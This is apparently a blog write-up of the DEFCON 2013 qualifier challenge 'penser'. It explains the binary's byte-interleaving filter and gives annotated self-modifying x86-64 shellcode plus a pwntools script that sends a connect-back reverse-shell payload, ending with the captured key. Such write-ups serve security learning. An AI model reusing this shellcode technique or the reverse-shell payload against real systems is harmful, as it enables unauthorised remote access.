---
title: penser - DEFCON quals 2013
author: thorlund
layout: post
published: true
date: 2013-06-19 23:04:01
---

The reversing was fairly trivial.

First the length of what was about to be received should be sent, with the added requirement that the length could not exceed 0x1000 bytes.

Then a buffer of that size was malloc'ed and received into.

mmap was used to make room for a buffer twice the size of the input and the received input was copied into the mmap'ed memory.

This was however just a decoy, as both buffers were passed on to a function located at 0x40124c, which copied each byte from the malloced into every second position of the mmapped buffer. The spaces were filled with null bytes, so if 41414141 was sent to the server, the mmap'ed buffer would contain 4100410041004100.

Two cases would stop this copying:

      1. if one of the bytes were less than 0x1f (with the exception of '\n'). This was a hard restriction because it would cause the function to return -1 and stop running.
      2. if a null byte was encountered or if the buffer was filled the copying would stop, but the rest of the program would continue running.

If the function returns correctly, the program will call the mmap'ed buffer.

So first there is a need to craft shellcode, in which each second byte is a null byte and no byte value is less than 0x1f or larger than 7f (signed compare).

There is however some good news, as the stack contained goodies. A pointer to the forgotten lands (the malloc'ed buffer) is located on the stack, free has been called on it, but the later portions of the received data is still there.

With this in mind, we needed to craft shellcode to do the following:

     1. Retrieve the pointer
     2. Add some offset
     3. Jump to the modified pointer

As all jumps have opcodes with values above 0x7f, we needed to change the last requirement into writing some code that makes some self-modifying shellcode.

```asm
00000000  59                pop rcx
00000001  004500            add [rbp+0x0],al ;JUNK
00000004  59                pop rcx
00000005  004500            add [rbp+0x0],al ;JUNK
00000008  59                pop rcx
00000009  004500            add [rbp+0x0],al ;JUNK
0000000C  59                pop rcx
0000000D  004500            add [rbp+0x0],al ;JUNK
00000010  5F                pop rdi ; rdi now contains
00000011  004500            add [rbp+0x0],al ;JUNK
00000014  54                push rsp
00000015  004500            add [rbp+0x0],al ;JUNK
00000018  5B                pop rbx
00000019  004500            add [rbp+0x0],al ;JUNK
0000001C  59                pop rcx ; rbx now points at any value pushed to the stack
0000001D  004500            add [rbp+0x0],al ;JUNK
00000020  6800560041        push dword 0x41005600 ; 56 is the offset to 7f
00000025  004500            add [rbp+0x0],al ;JUNK
00000028  59                pop rcx; ch contains 56
00000029  004500            add [rbp+0x0],al ;JUNK
0000002C  52                push rdx ; rdx contains a pointer to this code
0000002D  002B              add [rbx],ch;
0000002F  004500            add [rbp+0x0],al ;JUNK
00000032  5E                pop rsi; rsi = pointer to 7f
00000033  004500            add [rbp+0x0],al ;JUNK
00000036  6800440041        push dword 0x41004400 ; 44+7f = ret
0000003B  004500            add [rbp+0x0],al ;JUNK
0000003E  59                pop rcx
0000003F  002E              add [rsi],ch ; write the ret
00000041  004500            add [rbp+0x0],al ;JUNK
00000044  68002D0041        push dword 0x41002d00; offset into the "real" shellcode
00000049  004500            add [rbp+0x0],al ;JUNK
0000004C  58                pop rax
0000004D  004500            add [rbp+0x0],al ;JUNK
00000050  57                push rdi
00000051  0023              add [rbx],ah; add the offset to the malloced pointer
00000053  004500            add [rbp+0x0],al ;JUNK
00000056  7F                db 0x7f
```

All there is left to do now is to make the final python script:

```python
from pwn import *
splash()
context('amd64','linux','ipv4')

HOST = '127.0.0.1'
PORT = 8273


MY_HOST = '127.0.0.1'
MY_PORT = 1337

sock  = remote(HOST,PORT)
payload = ''
with open('init.asm') as init:
    payload += asm(init.read())

assert(payload)
if any(x <> 0 for x in payload[1::2]):
    print "you dear sir, have failed"
    exit(-1)

payload = payload[::2]
payload += chr(0)
payload += asm(shellcode.connectback(MY_HOST,MY_PORT))

sock.send(p32(len(payload)))

sock.send(payload)
```

From the shell:
    cat key
    The key is: TBDHelloooookdkdkiekdiekdiek
